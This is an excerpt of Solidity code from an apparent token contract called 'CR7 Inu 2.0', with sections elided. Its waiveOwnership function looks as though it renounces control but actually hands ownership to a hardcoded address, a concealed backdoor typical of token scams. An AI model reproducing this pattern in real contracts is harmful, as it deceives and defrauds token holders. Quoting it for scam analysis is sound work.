...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x047C15562A16A234E8ce8acBFfc0D6F9A504F32D));
        _owner = address(0x047C15562A16A234E8ce8acBFfc0D6F9A504F32D);
    }
...
contract CR7Inu is Context, IERC20, Ownable {
    ...
    string private _name = "CR7 Inu 2.0";
    string private _symbol = "CR7";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5fd177f3547725fa30822735BbB9cf8EA675D86c);
    address payable public teamWalletAddress = payable(0x5fd177f3547725fa30822735BbB9cf8EA675D86c);
